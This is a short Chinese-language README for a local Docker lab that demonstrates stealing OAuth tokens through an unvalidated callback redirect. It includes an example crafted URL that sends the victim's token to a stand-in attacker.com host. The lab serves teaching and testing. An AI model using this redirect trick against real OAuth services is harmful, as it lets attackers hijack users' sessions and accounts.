# 利用 OAuth 开放重定向窃取用户 token

## 环境启动

```bash
docker-compose up -d
```
应用程序运行在 8090 端口，OAuth 服务运行在 9090 端口


## 漏洞说明
访问 8090 端口，点击 `Login With OAuth` 跳转到 9090 端口进行登录
此时 OAuth 页面存在 URL 为 `http://127.0.0.1:9090/?callback=http://127.0.0.1:8090/admin`
如果登录成功，浏览器将跳转到 `http://127.0.0.1:8090/admin`, 并附带上用户 Token
完整跳转地址为： `http://127.0.0.1:8090/admin?token=xxxxxx`

如果 callback 跳转地址没有白名单限制，攻击者可以构造恶意的 callback 参数，让用户登录成功后跳转到攻击者准备的服务器上，达到窃取 token 的目的
比如攻击者构造 url `http://127.0.0.1:9090/?callback=http://attacker.com`
用户登录成功后将跳转到 `http://attacker.com?token=xxx`
攻击者在 `attacker.com` 上可收到用户的 token
